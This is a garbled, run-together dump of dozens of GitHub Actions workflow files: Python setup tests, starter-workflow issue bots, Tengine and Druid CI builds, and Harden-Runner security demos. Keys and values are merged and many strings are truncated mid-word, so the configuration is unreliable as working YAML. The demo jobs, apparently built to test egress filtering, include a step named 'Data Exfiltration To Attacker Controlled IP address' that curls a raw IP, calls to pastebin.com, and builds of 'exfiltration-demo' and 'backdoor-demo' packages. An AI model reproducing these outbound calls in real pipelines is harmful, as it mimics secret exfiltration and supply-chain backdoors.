'<3.13'name: R ... n <3.13Verify <3.13python __tests__/verify-python.py 3.12python  ... py 3.12name: Verify <3.13Test Raw Endpoint AccessTest Ra ...  Accesscurl -L https://raw.githubusercontent.com/actions/python-versions/main/versions-manifest.json | jq empty
name: T ...  Accessname: T ... -pythontest-setup-python:name: e2e tests/home/huawei/github-actions-security/.github/workflows/actions_setup-python__licensed.yml/home/huawei/github-actions-security/.github/workflows/actions_setup-python__publish-immutable-actions.yml/home/huawei/github-actions-security/.github/workflows/actions_setup-python__release-new-action-version.yml/home/huawei/github-actions-security/.github/workflows/actions_setup-python__test-graalpy.ymlValidate GraalPy e2esetup-graalpySetup GraalPy ${{ matrix.graalpy }} ${{ matrix.os }}Setup G ... x.os }}graalpygraalpy-22.3'graalpy-22.3'graalpy-23.0'graalpy-23.0'graalpy-23.1'graalpy-23.1'graalpy-24.1'graalpy-24.1'- 'graalpy-22.3'setup-python ${{ matrix.graalpy }}setup-p ... alpy }}setup-python${{ matrix.graalpy }}${{ mat ... alpy }}python- ... alpy }}name: s ... alpy }}Check python-path./__tests__/check-python-path.sh '${{ steps.setup-python.outputs.python-path }}'./__tes ... ath }}'name: C ... on-pathGraalPy and Python versionGraalPy ... versionpython --versionRun simple codepython -c 'import math; print(math.factorial(5))'python  ... al(5))'name: R ... le codeAssert GraalPy is runningAssert  ... runningimport platform
assert platform.python_implementation().lower() == "graalvm"
pythonname: A ... runningAssert expected binaries (or symlinks) are presentAssert  ... presentEXECUTABLE=${{ matrix.graalpy }}
EXECUTABLE=${EXECUTABLE/graalpy-/graalpy}  # remove the first '-' in "graalpy-X.Y" -> "graalpyX.Y" to match executable name
EXECUTABLE=${EXECUTABLE%%-*}  # remove any -* suffixe
${EXECUTABLE} --version
name: A ... presentname: S ... x.os }}setup-graalpy-noenvSetup GraalPy ${{ matrix.graalpy }} ${{ matrix.os }} (noenv)Setup G ... (noenv)graalpy22.3'graalpy22.3'graalpy23.0'graalpy23.0'graalpy23.1'graalpy23.1'graalpy24.1'graalpy24.1'['graal ... y24.1']update-environment${{ steps.setup-python.outputs.python-path }} --version${{ ste ... version${{ steps.setup-python.outputs.python-path }} -c 'import math; print(math.factorial(5))'${{ ste ... al(5))'name: S ... (noenv)Setup GraalPy and check latestSetup G ...  latestgraalpy-24.x'graalpy-24.x'python- ... y-24.x'EXECUTABLE='${{ steps.graalpy.outputs.python-version }}'
EXECUTABLE="${EXECUTABLE%.*}"
${EXECUTABLE} --version
setup-graalpy:name: V ... lPy e2e/home/huawei/github-actions-security/.github/workflows/actions_setup-python__test-pypy.ymlValidate PyPy e2e30 3 * * *cron: 30 3 * * *- cron: 30 3 * * *setup-pypySetup PyPy ${{ matrix.pypy }} ${{ matrix.os }}Setup P ... x.os }}pypypypy-2.7'pypy-2.7'pypy-3.10'pypy-3.10'pypy3.9'pypy3.9'pypy-2.7-v7.3.17'pypy-2.7-v7.3.17'pypy-3.10-v7.3.17'pypy-3.10-v7.3.17'pypy-3.10-v7.3.16'pypy-3.10-v7.3.16'pypy-3.10-v7.3.x'pypy-3.10-v7.3.x'pypy-2.7-v7.3.12rc1'pypy-2 ... .12rc1'pypy-3.10-nightly'pypy-3.10-nightly'pypy3.10-v7.3.17'pypy3.10-v7.3.17'pypy3.11-v7.3.19'pypy3.11-v7.3.19'- 'pypy-2.7'setup-python ${{ matrix.pypy }}setup-p ... pypy }}${{ matrix.pypy }}python- ... pypy }}name: s ... pypy }}PyPy and Python versionPyPy an ... versionname: P ... versionAssert PyPy is runningimport platform
assert platform.python_implementation().lower() == "pypy"
EXECUTABLE=${{ matrix.pypy }}
EXECUTABLE=${EXECUTABLE/pypy-/pypy}  # remove the first '-' in "pypy-X.Y" -> "pypyX.Y" to match executable name
EXECUTABLE=${EXECUTABLE%%-*}  # remove any -* suffixe
${EXECUTABLE} --version
check-non-eolCheck non-eol ${{ matrix.pypy }} on ${{ matrix.os }}Check n ... x.os }}macos-14macos-15windows-2019windows-2022windows-2025ubuntu-24.04- macos-13pypy-3.11'pypy-3.11'['pypy- ... -3.11']name: C ... x.os }}setup-pypy-noenvSetup PyPy ${{ matrix.pypy }} ${{ matrix.os }} (noenv)Setup P ... (noenv)pypy2.7'pypy2.7'pypy3.10-nightly'pypy3.10-nightly'pypy3.11'pypy3.11'['pypy2 ... y3.11']Setup PyPy and check latestSetup P ...  latestpypy-3.11-v7.3.x'pypy-3.11-v7.3.x'python- ... v7.3.x'EXECUTABLE="pypy-3.11-v7.3.x"
EXECUTABLE=${EXECUTABLE/-/}  # remove the first '-' in "pypy-X.Y" -> "pypyX.Y" to match executable name
EXECUTABLE=${EXECUTABLE%%-*}  # remove any -* suffixe
${EXECUTABLE} --version
setup-pypy-multiple-versionssetup-p ... ersionspypy-3.11-v7.3.x
pypy-3.10-v7.3.x
pypy3.9
python-version: |EXECUTABLE='pypy3.9'
EXECUTABLE=${EXECUTABLE/pypy-/pypy}  # remove the first '-' in "pypy-X.Y" -> "pypyX.Y" to match executable name
EXECUTABLE=${EXECUTABLE%%-*}  # remove any -* suffixe
${EXECUTABLE} --version
setup-pypy:name: V ... yPy e2e/home/huawei/github-actions-security/.github/workflows/actions_setup-python__test-python-freethreaded.ymlValidate Python e2e freethreadValidat ... ethreadsetup-versions-from-manifestsetup-v ... anifestSetup ${{ matrix.python }} ${{ matrix.os }}Setup $ ... x.os }}setup-python ${{ matrix.python }}setup-p ... thon }}${{ matrix.python }}python- ... thon }}name: s ... thon }}Verify Python versionVerify  ... version${{ steps.setup-python.outputs.python-path }} -VVV${{ ste ... }} -VVVname: V ... versionsetup-versions-from-filesetup-v ... om-fileSetup ${{ matrix.python }} ${{ matrix.os }} version fileSetup $ ... on filebuild-version-file ${{ matrix.python }}build-v ... thon }}echo ${{ matrix.python }} > .python-versionecho ${ ... versionname: b ... thon }}python-version-file.python-versionpython- ... versionsetup-versions-from-file-without-parametersetup-v ... rameterSetup ${{ matrix.python }} ${{ matrix.os }} version file without parameterSetup $ ... rametername: S ... rametersetup-versions-from-standard-pyproject-filesetup-v ... ct-fileSetup ${{ matrix.python }} ${{ matrix.os }} standard pyproject fileSetup $ ... ct fileecho '[project]
  requires-python = "${{ matrix.python }}"
' > pyproject.toml
pyproject.tomlpython- ... ct.tomlname: S ... ct filesetup-versions-from-poetry-pyproject-fileSetup ${{ matrix.python }} ${{ matrix.os }} poetry pyproject fileecho '[tool.poetry.dependencies]
  python = "${{ matrix.python }}"
' > pyproject.toml
setup-versions-from-tool-versions-filesetup-v ... ns-fileSetup ${{ matrix.python }} ${{ matrix.os }} .tool-versions fileSetup $ ... ns file3.14t-dev[3.13.0 ... 4t-dev]build-tool-versions-file ${{ matrix.python }}build-t ... thon }}echo "python ${{ matrix.python }}" > .tool-versions
setup-python using .tool-versions ${{ matrix.python }}setup-python-tool-versionspython- ... ersionsname: S ... ns filesetup-pre-release-version-from-manifestsetup-p ... anifestSetup 3.14.0-alpha.6 ${{ matrix.os }}Setup 3 ... x.os }}setup-python 3.14.0-alpha.6setup-p ... alpha.63.14.0-alpha.6'3.14.0-alpha.6'python- ... lpha.6'name: s ... alpha.6setup-dev-versionSetup 3.14t-dev ${{ matrix.os }}setup-python 3.14t-devsetup-p ... 14t-dev'3.14t-dev'python- ... 4t-dev'name: s ... 14t-devValidate version${{ startsWith(steps.setup-python.outputs.python-version, '3.14.') }}${{ sta ... 4.') }}setup-prerelease-versionsetup-p ... versionSetup 3.14t ${{ matrix.os }}setup-python 3.14t3.14t'3.14t'allow-prereleasespython- ... '3.14t'name: s ... n 3.14tsetup-versions-noenvSetup ${{ matrix.python }} ${{ matrix.os }} (noenv)Setup $ ... (noenv)3.13t[3.13t, 3.14t-dev]Setup Python and check latestsetup-python-multiple-python-versions3.13.1t
3.13.2t
3.14t-dev
setup-versions-with-freethread-inputsetup-v ... d-inputSetup ${{ matrix.python }} ${{ matrix.os }} using freethread input parameter3.14-dev[3.13.1 ... lpha.6]Validate GILpython ./__tests__/verify-freethreaded.pypython  ... aded.pyname: Validate GILsetup-v ... nifest:name: V ... ethread/home/huawei/github-actions-security/.github/workflows/actions_setup-python__test-python.ymlValidate Python e2e3.12.3[3.9.13 ... 3.13.2]$pythonVersion = (python --version)
if ("Python ${{ matrix.python }}" -ne "$pythonVersion"){
  Write-Host "The current version is $pythonVersion; expected version is ${{ matrix.python }}"
  exit 1
}
$pythonVersion
==3.12.3'==3.12.3'$pythonVersion = (python --version)
if ("Python ${{ matrix.python }}".replace("==", "") -ne "$pythonVersion"){
  Write-Host "The current version is $pythonVersion; expected version is ${{ matrix.python }}"
  exit 1
}
$pythonVersion
pypy3.11-7.3.18graalpy-24.1.2[pypy3. ... 14-dev]$pythonVersion = (python --version)
if ("Python 3.14.0a6" -ne "$pythonVersion"){
  Write-Host "The current version is $pythonVersion; expected version is 3.14.0a6"
  exit 1
}
$pythonVersion
Setup 3.14-dev ${{ matrix.os }}setup-python 3.14-devsetup-p ... .14-dev'3.14-dev'python- ... 14-dev'name: s ... .14-devSetup 3.14 ${{ matrix.os }}setup-python 3.143.14'3.14'python- ...  '3.14'name: s ... on 3.14['3.9', ... '3.13']Python versionname: Python version$pythonVersion = (python --version)
if ("$pythonVersion" -NotMatch "${{ matrix.python-version }}"){
  Write-Host "The current version is $pythonVersion; expected version is ${{ matrix.python-version }}"
  exit 1
}
$pythonVersion
3.9
3.10
3.11
3.12
3.13
$pythonVersion = (python --version)
if ("$pythonVersion" -NotMatch "3.13"){
  Write-Host "The current version is $pythonVersion; expected version is 3.13"
  exit 1
}
$pythonVersion
name: V ... hon e2e/home/huawei/github-actions-security/.github/workflows/actions_setup-python__update-config-files.yml/home/huawei/github-actions-security/.github/workflows/actions_starter-workflows__auto-assign-issues.ymlIssue assignmentauto-assignAuto-assign issue'Auto-assign issue'pozil/auto-assign-issue@v1.11.0pozil/a ... v1.11.0assigneesphantsure,tiwarishub,anuragc617,vsvipul,bishal-pdmsftphantsu ... -pdmsftnumOfAssignee1assigne ... -pdmsftname: ' ...  issue'- name: ...  issue'auto-assign:name: I ... ignment/home/huawei/github-actions-security/.github/workflows/actions_starter-workflows__auto-assign.ymlAuto Assign'Auto Assign'ready_for_review[opened ... review]types:  ... review]add-reviewskentaro-m/auto-assign-action@v1.2.2kentaro ... @v1.2.2uses: k ... @v1.2.2- uses: ... @v1.2.2add-reviews:name: 'Auto Assign'/home/huawei/github-actions-security/.github/workflows/actions_starter-workflows__label-feature.ymlClose as a featurelabeled[labeled]types: [labeled]Close Issuepeter-evans/close-issue@v3peter-e ... ssue@v3contains(github.event.issue.labels.*.name, 'feature')contain ... ature')commentThank you ðŸ™‡ for this request. This request has been classified as a feature by the maintainers.

We take all the requests for features seriously and have passed this on to the internal teams for their consideration.

Because any feature requires further maintenance and support in the long term by this team, we would like to exercise caution into adding new features. If this feature is something that can be implemented independently, please consider forking this repository and adding the feature.
comment: |name: Close Issue- name: Close Issuename: C ... feature/home/huawei/github-actions-security/.github/workflows/actions_starter-workflows__label-support.ymlClose as a support issueClose a ... t issuecontains(github.event.issue.labels.*.name, 'support')contain ... pport')Sorry, but we'd like to keep issues related to code in this repository. Thank you ðŸ™‡ 

If you have questions about writing workflows or action files, then please [visit the GitHub Community Forum's Actions Board](https://github.community/t5/GitHub-Actions/bd-p/actions)

If you are having an issue or question about GitHub Actions then please [contact customer support](https://help.github.com/en/articles/about-github-actions#contacting-support)
name: C ... t issue/home/huawei/github-actions-security/.github/workflows/actions_starter-workflows__labeler-triage.ymlactions/labeler@v5uses: a ... eler@v5- uses: ... eler@v5/home/huawei/github-actions-security/.github/workflows/actions_starter-workflows__lint.yamlpre-commitactions/setup-python@v4actions ... thon@v4python-version: 3.11uses: a ... thon@v4Cache pre-commitactions/cache@v4~/.cache/pre-commitpre-commit-3|${{ env.pythonLocation }}|${{ hashFiles('.pre-commit-config.yaml') }}pre-com ... ml') }}path: ~ ... -commitname: C ... -commitInstall pre-commitpip3 install pre-commitpip3 in ... -commitname: I ... -commitRun pre-commitpre-commit run --all-files --show-diff-on-failure --color alwayspre-com ...  alwaysname: Run pre-commitname: pre-commitpre-commit:/home/huawei/github-actions-security/.github/workflows/actions_starter-workflows__stale.ymlMark stale issues and pull requestsMark st ... equestsworkflow_dispatch:actions/stale@v8This issue has become stale and will be closed automatically within a period of time. Sorry about that.'This i ...  that.'This pull request has become stale and will be closed automatically within a period of time. Sorry about that.'This p ...  that.'no-issue-activity'no-issue-activity'no-pr-activity'no-pr-activity'stale-i ...  that.'uses: a ... tale@v8- uses: ... tale@v8/home/huawei/github-actions-security/.github/workflows/actions_starter-workflows__sync-ghes.yamlSync workflows for GHESSync wo ... or GHES[ main ]branches: [ main ]syncgit fetch --no-tags --prune --depth=1 origin +refs/heads/*:refs/remotes/origin/*
git config user.email "cschleiden@github.com"
git config user.name "GitHub Actions"
run: |script/sync-ghes/package-lock.jsonscript/ ... ck.jsonuses: a ... node@v4Check starter workflows for GHES compatCheck s ...  compatnpm ci
npx ts-node-script ./index.ts
working-directory./script/sync-ghesname: C ...  compatgit add -A
if [ -z "$(git status --porcelain)" ]; then
  echo "No changes to commit"
else
  git commit -m "Updating GHES workflows"
fi
git pushrun: git pushsync:name: S ... or GHES/home/huawei/github-actions-security/.github/workflows/actions_starter-workflows__validate-data.yamlValidate Datavalidate-datascript/validate-data/package-lock.jsonValidate workflows./script/validate-data./scrip ... te-dataname: V ... rkflowsvalidate-data:name: Validate Data/home/huawei/github-actions-security/.github/workflows/alibaba_druid__ci.yamlJava CIdocs/**'docs/**'- 'docs/**'[ ubuntu-latest ]java821[ 8, 11, 17, 21 ]os: [ u ... atest ]max-parallel16Test JDK ${{ matrix.java }}, ${{ matrix.os }}Test JD ... x.os }}Set up JDKactions/setup-java@v4actions ... java@v4distributiontemurin'temurin'java-version${{ matrix.java }}maven'maven'distrib ... emurin'name: Set up JDKBuild with Maven if test jdk8Build w ... st jdk8${{ matrix.java == '8' || matrix.java == '11'}}${{ mat ...  '11'}}./mvnw -Pgen-javadoc clean package -B./mvnw  ... kage -Bname: B ... st jdk8Build with Maven if test jdk17Build w ... t jdk17${{ matrix.java == '17' || matrix.java == '21' }}${{ mat ... '21' }}./mvnw -Penable-for-jdk17+,gen-code-cov clean package -Bname: B ... t jdk17Codecov if test jdk17"Codeco ...  jdk17"${{ matrix.java == '17' }}${{ mat ... '17' }}codecov/codecov-action@v3.1.0codecov ... @v3.1.0files./core/target/site/jacoco/jacoco.xml,./druid-spring-boot-starter/target/site/jacoco/jacoco.xml,./druid-spring-boot-3-starter/target/site/jacoco/jacoco.xml./core/ ... oco.xmlfiles:  ... oco.xmlname: " ...  jdk17"name: Java CI/home/huawei/github-actions-security/.github/workflows/alibaba_tengine__ci-arm64.ymlbuild tenginemaster[ master ]branches: [ master ]build-arm64ubuntu-20.04"ubuntu-20.04"compilerGNUCCgccCXXg++{ compi ... X: g++}LLVMclangclang++{ compi ... lang++}- { com ... X: g++}compiler:Checkout Tengineactions/checkout@v3name: C ... Tenginecheckout luajit2'checkout luajit2'repositoryopenresty/luajit2luajit2reposit ... luajit2name: ' ... uajit2'Compile with ${{ matrix.compiler.compiler }}Compile ... iler }}uraimo/run-on-arch-action@v2uraimo/ ... tion@v2aarch64distroubuntu20.04githubToken${{ github.token }}dockerRunArgs--volume "${PWD}:/tengine"
installset -x
apt-get update -q -y
apt-get install -q -y make gcc g++ clang libgd-dev libgeoip-dev libxslt1-dev libpcre++0v5 libpcre++-dev liblua5.1-0-dev lua5.1 libperl-dev cpanminus libssl-dev file
set -x
cd /tengine
echo "Build luajit2"
cd luajit2
make -j2
make install
cd ..
echo "Build tengine"
export CC=${{ matrix.compiler.CC }}
export CXX=${{ matrix.compiler.CXX }}
export LUAJIT_LIB=/usr/local/lib
export LUAJIT_INC=/usr/local/include/luajit-2.1
./configure \
  --with-ld-opt="-Wl,-lpcre,-rpath,/usr/local/lib" \
  --with-ipv6 \
  --with-http_ssl_module \
  --with-http_v2_module \
  --with-http_addition_module \
  --with-stream \
  --with-stream_ssl_module \
  --with-stream_realip_module \
  --with-stream_geoip_module \
  --with-stream_ssl_preread_module \
  --with-stream_sni \
  --add-module=./modules/ngx_backtrace_module \
  --add-module=./modules/ngx_debug_pool \
  --add-module=./modules/ngx_debug_timer \
  --add-module=./modules/ngx_debug_conn \
  --add-module=./modules/ngx_http_concat_module \
  --add-module=./modules/ngx_http_footer_filter_module \
  --add-module=./modules/ngx_http_lua_module \
  --add-module=./modules/ngx_http_proxy_connect_module \
  --add-module=./modules/ngx_http_reqstat_module \
  --add-module=./modules/ngx_http_slice_module \
  --add-module=./modules/ngx_http_sysguard_module \
  --add-module=./modules/ngx_http_trim_filter_module \
  --add-module=./modules/ngx_http_upstream_check_module \
  --add-module=./modules/ngx_http_upstream_consistent_hash_module \
  --add-module=./modules/ngx_http_upstream_dynamic_module \
  --add-module=./modules/ngx_http_upstream_dyups_module \
  --add-module=./modules/ngx_http_upstream_iwrr_module \
  --add-module=./modules/ngx_http_upstream_keepalive_module \
  --add-module=./modules/ngx_http_upstream_session_sticky_module \
  --add-module=./modules/ngx_http_upstream_vnswrr_module \
  --add-module=./modules/ngx_http_user_agent_module \
  --add-module=./modules/ngx_multi_upstream_module \
  --add-module=./modules/ngx_slab_stat \
  --without-http_upstream_keepalive_module
make -j2
make install
file /usr/local/nginx/sbin/nginx | grep aarch64
arch: aarch64name: C ... iler }}- name: ... Tengineruns-on ... -20.04"build-arm64:name: build tengine/home/huawei/github-actions-security/.github/workflows/alibaba_tengine__ci.ymltest tenginebuild-and-testuses: a ... kout@v3get dependenciessudo apt update
sudo apt remove nginx libgd3
sudo apt install -y libgd-dev libgeoip-dev libxslt1-dev libpcre++0v5 libpcre++-dev liblua5.1-0-dev lua5.1 libperl-dev cpanminus libssl-dev
name: g ... denciesbuild luajit2'build luajit2'make
sudo make install
checkout lua-resty-lrucache'checko ... ucache'openresty/lua-resty-lrucacheopenres ... rucachelua-resty-lrucachereposit ... rucachename: ' ... ucache'build lua-resty-lrucache'build  ... ucache'sudo make install
checkout lua-resty-core'checko ... y-core'openresty/lua-resty-coreopenres ... ty-corerefv0.1.27lua-resty-corereposit ... ty-corename: ' ... y-core'build lua-resty-core'build  ... y-core'${{ matrix.compiler.CC }}${{ mat ... r.CC }}${{ matrix.compiler.CXX }}${{ mat ... .CXX }}LUAJIT_LIB/usr/local/libLUAJIT_INC/usr/local/include/luajit-2.1/usr/lo ... jit-2.1CC: ${{ ... r.CC }}./configure \
   --with-debug \
   --with-ld-opt="-Wl,-lpcre,-rpath,/usr/local/lib" \
   --with-ipv6 \
   --with-openssl-async \
   --with-http_ssl_module \
   --with-http_v2_module \
   --with-http_addition_module \
   --with-stream \
   --with-stream_ssl_module \
   --with-stream_realip_module \
   --with-stream_geoip_module \
   --with-stream_ssl_preread_module \
   --with-stream_sni \
   --add-module=./modules/ngx_backtrace_module \
   --add-module=./modules/ngx_debug_pool \
   --add-module=./modules/ngx_debug_timer \
   --add-module=./modules/ngx_debug_conn \
   --add-module=./modules/ngx_http_concat_module \
   --add-module=./modules/ngx_http_footer_filter_module \
   --add-module=./modules/ngx_http_lua_module \
   --add-module=./modules/ngx_http_proxy_connect_module \
   --add-module=./modules/ngx_http_reqstat_module \
   --add-module=./modules/ngx_http_slice_module \
   --add-module=./modules/ngx_http_sysguard_module \
   --add-module=./modules/ngx_http_trim_filter_module \
   --add-module=./modules/ngx_http_upstream_check_module \
   --add-module=./modules/ngx_http_upstream_consistent_hash_module \
   --add-module=./modules/ngx_http_upstream_dynamic_module \
   --add-module=./modules/ngx_http_upstream_dyups_module \
   --add-module=./modules/ngx_http_upstream_iwrr_module \
   --add-module=./modules/ngx_http_upstream_keepalive_module \
   --add-module=./modules/ngx_http_upstream_session_sticky_module \
   --add-module=./modules/ngx_http_upstream_vnswrr_module \
   --add-module=./modules/ngx_http_user_agent_module \
   --add-module=./modules/ngx_multi_upstream_module \
   --add-module=./modules/ngx_slab_stat \
   --without-http_upstream_keepalive_module
make -j2
sudo make install
name: buildtengine test cases using nginx-tests libtengine ... sts libtests/nginx-testsTEST_NGINX_BINARY/usr/local/nginx/sbin/nginx/usr/lo ... n/nginxTEST_NG ... n/nginxsudo cpanm --notest Net::DNS::Nameserver > build.log 2>&1 || (cat build.log && exit 1)
prove -v -Inginx-tests/lib tengine-tests/
prove -v -Inginx-tests/lib ../../modules/ngx_http_proxy_connect_module/t
prove -v -Inginx-tests/lib ../../modules/ngx_debug_timer/t
prove -v -Inginx-tests/lib ../../modules/ngx_debug_conn/t
prove -v -Inginx-tests/lib ../../modules/ngx_slab_stat/t
name: t ... sts libtengine test cases using test-nginx libtengine ... inx libtests/test-nginxsudo cpanm --notest Shell Test::Base Test::LongString List::MoreUtils LWP::UserAgent HTTP::Response  > build.log 2>&1 || (cat build.log && exit 1)
mkdir t
PATH=/usr/local/nginx/sbin:$PATH \
prove -v -Itest-nginx/lib cases/
name: t ... inx lib- uses: ... kout@v3build-and-test:name: test tengine/home/huawei/github-actions-security/.github/workflows/alibaba_tengine__test-nginx-core.ymltest nginx coresudo apt update
sudo apt remove nginx libgd3
sudo apt install -y libgd-dev libgeoip-dev libxslt1-dev libpcre++0v5 libpcre++-dev liblua5.1-0-dev lua5.1 libperl-dev cpanminus libssl-dev
# for building nginx core
sudo apt install -y libgoogle-perftools-dev
# for running cases in nginx-tests
sudo apt install -y uwsgi-plugin-python3 uwsgi ffmpeg memcached libsofthsm2-dev
# TODO: fix https://github.com/alibaba/tengine/issues/1720, then remove "-D T_NGX_HTTP_IMAGE_FILTER=0"

# NOTE:
# For "-D T_NGX_MODIFY_DEFAULT_VALUE=0", we dont compile the source included in this macro, otherwise some nginx-tests cases tests will fail.
# For "-D T_NGX_SERVER_INFO=0", it makes some cases pass, such as userid.t.
# For "-D T_NGX_HTTP_UPSTREAM_RANDOM=0", it makes some cases pass, such as image_filter_finalize.t.
./configure  \
   --with-cc-opt="-D T_NGX_MODIFY_DEFAULT_VALUE=0 -D T_NGX_HTTP_IMAGE_FILTER=0 -D T_NGX_SERVER_INFO=0 -D T_NGX_HTTP_UPSTREAM_RANDOM=0" \
   --with-ld-opt="-Wl,-lpcre,-rpath,/usr/local/lib" \
   --with-openssl-async \
   --with-pcre \
   --with-http_ssl_module \
   --with-http_image_filter_module \
   --with-http_v2_module \
   --with-http_addition_module \
   --with-http_mp4_module \
   --with-http_realip_module \
   --with-http_xslt_module \
   --with-http_geoip_module \
   --with-http_sub_module \
   --with-http_dav_module \
   --with-http_flv_module \
   --with-http_gunzip_module \
   --with-http_gzip_static_module \
   --with-http_auth_request_module \
   --with-http_random_index_module \
   --with-http_secure_link_module \
   --with-http_degradation_module \
   --with-http_slice_module \
   --with-http_stub_status_module \
   --with-mail \
   --with-mail_ssl_module \
   --with-stream \
   --with-stream_ssl_module \
   --with-stream_realip_module \
   --with-stream_geoip_module \
   --with-stream_ssl_preread_module \
   --with-google_perftools_module \
   --with-cpp_test_module \
   --with-compat \
   --add-module=modules/mod_config \
   --add-module=modules/mod_dubbo \
   --add-module=modules/ngx_backtrace_module \
   --add-module=modules/ngx_debug_timer \
   --add-module=modules/ngx_http_concat_module \
   --add-module=modules/ngx_http_footer_filter_module \
   --add-module=modules/ngx_http_lua_module \
   --add-module=modules/ngx_http_proxy_connect_module \
   --add-module=modules/ngx_http_reqstat_module \
   --add-module=modules/ngx_http_sysguard_module \
   --add-module=modules/ngx_http_trim_filter_module \
   --add-module=modules/ngx_http_upstream_check_module \
   --add-module=modules/ngx_http_upstream_consistent_hash_module \
   --add-module=modules/ngx_http_upstream_dynamic_module \
   --add-module=modules/ngx_http_upstream_session_sticky_module \
   --add-module=modules/ngx_http_upstream_vnswrr_module \
   --add-module=modules/ngx_http_user_agent_module \
   --add-module=modules/ngx_multi_upstream_module \
   --add-module=modules/ngx_slab_stat \
   --add-module=modules/ngx_http_upstream_dyups_module \
   --with-http_perl_module \
   --with-stream_sni \
   --with-openssl-async \
   --with-debug
   # skip ngx_debug_pool, it modified NGX_MIN_POOL_SIZE, which made some test case failed (http_header_buffers.t)
   # skip tengine upstream keepalive module
   #--without-http_upstream_keepalive_module \
   #--add-module=modules/ngx_http_upstream_keepalive_module \
   # skip tengine slice module
   #--add-module=modules/ngx_http_slice_module \
make -j2
sudo make install
run cases in nginx-testsrun cas ... x-testsTEST_NGINX_UNSAFEyes# prepare perl library for test case
sudo cpanm --notest SCGI Protocol::WebSocket Net::SSLeay IO::Socket::SSL Cache::Memcached Cache::Memcached::Fast Net::DNS::Nameserver GD > build.log 2>&1 || (cat build.log && exit 1)
# fixed http_method.t for tengine proxy_connect module
sed -i -e "s+405 Not Allowed(?!.*200 OK)/s, 'connect'+400 Bad Request(?!.*200 OK)/s, 'connect'+" nginx-tests/http_method.t
# run cases in nginx-tests
prove -I nginx-tests/lib nginx-tests/
# It must be root for some cases.
sudo groupadd wheel    # for proxy_bind_transparent.t
sudo TEST_NGINX_BINARY=/usr/local/nginx/sbin/nginx TEST_NGINX_UNSAFE=yes prove -I nginx-tests/lib nginx-tests/proxy_bind_transparent.t nginx-tests/proxy_bind_transparent_capability.t
name: r ... x-testsname: t ... nx core/home/huawei/github-actions-security/.github/workflows/alibaba_tengine__test-ntls.ymltest tengine ntlstenginepath: tenginecheckout TongsuoTongsuo-Project/TongsuoTongsuo ... TongsuoTongsuoreposit ... Tongsuoname: c ... Tongsuobuild Tongsuo./config --prefix=${RUNNER_TEMP}/tongsuo enable-ntls no-shared
make -s -j4
make install_sw
make clean
name: build Tongsuobuild Tengine./configure \
  --with-ld-opt="-Wl,-lpcre,-rpath,/usr/local/lib" \
  --with-pcre \
  --add-module=modules/ngx_tongsuo_ntls \
  --add-module=modules/ngx_http_lua_module \
  --with-openssl=../Tongsuo \
  --with-openssl-opt="--api=1.1.1 enable-ntls" \
  --with-http_ssl_module \
  --with-http_v2_module \
  --with-stream \
  --with-stream_ssl_module \
  --with-stream_sni
make -j2
sudo make install
name: build Tenginerun test casesTEST_OPENSSL_BINARY${{ runner.temp }}/tongsuo/bin/tongsuo${{ run ... tongsuoTEST_NGINX_LEAVETEST_OP ... tongsuoprove -Itests/nginx-tests/nginx-tests/lib/ modules/ngx_tongsuo_ntls/t
name: run test casesdebugfor file in `ls /tmp/nginx-test-*/error.log`; do cat $file; done
name: debugname: t ... ne ntls/home/huawei/github-actions-security/.github/workflows/anomalous-outbound-calls.yamlAnomalous Outbound CallsAnomalo ... d Callsunexpected-outbound-callsunexpec ... d-callsAnomalousOutboundCallsAnomalo ... ndCallsHarden Runnerstep-security/harden-runner@v2step-se ... nner@v2egress-policyauditegress-policy: auditname: Harden Runnercurl https://pastebin.com -L  || true"curl h ... | true"run: "c ... | true"curl https://google.com -L  || truecurl microsoft.com:443  --connect-timeout 5 || true"curl m ... | true"curl amazon.com:443  --connect-timeout 5 || true"curl a ... | true"- name: ...  Runnername: A ... ndCallsunexpec ... -calls:name: A ... d Calls/home/huawei/github-actions-security/.github/workflows/arc-codecov-simulation.ymlARC: Network Filtering with Harden-Runner"ARC: N ... Runner"self-hostedblockallowed-endpointsapi.github.com:443 *.docker.io:443 ghcr.io:443 github.com:443 objects.githubusercontent.com:443 nodejs.org:443 production.cloudflare.docker.com:443 registry.npmjs.org:443
egress-policy: blockactions/setup-node@v3actions ... node@v3node-version: 18uses: a ... node@v3cd ./src/exfiltration-demo
npm install
name: npm installPublish to Registryelgohr/Publish-Docker-Github-Action@v5elgohr/ ... tion@v5${{ github.repository }}/prod:latest${{ git ... :latestworkdir./src/exfiltration-demo./src/e ... on-demoname: $ ... :latestname: P ... egistryruns-on: self-hostedname: " ... Runner"/home/huawei/github-actions-security/.github/workflows/arc-secure-by-default.ymlARC: Secure-By-Default Cluster-Level Policy"ARC: S ... Policy"direct-ip-hostedData Exfiltration To Attacker Controlled IP addressData Ex ... addresscurl 104.16.209.12 --connect-timeout 5curl 10 ... meout 5name: D ... addressdirect-ip-arcdirect-ip-hosted:name: " ... Policy"/home/huawei/github-actions-security/.github/workflows/arc-solarwinds-simulation.ymlARC: File Monitoring with Harden-Runner"ARC: F ... Runner"arc-solarwinds-simulationarc-sol ... ulationcd ./src/backdoor-demo
npm install
./src/backdoor-demoarc-sol ... lation:/home/huawei/github-actions-security/.github/workflows/arc-zero-effort-observability.ymlARC: Zero-effort Observability"ARC: Z ... bility"name: " ... bility"/home/huawei/github-actions-security/.github/workflows/awslabs_amazon-ecr-credential-helper__build.yamlgit-secrets'ubuntu-22.04'Pull latest awslabs/git-secrets repoPull la ... ts repoawslabs/git-secrets1.3.0fetch-tagsreposit ... secretsname: P ... ts repoInstall git secrets from sourceInstall ...  sourcesudo make installname: I ...  sourceScan repository for git secretsScan re ... secretsgit secrets --register-aws
git secrets --scan-history
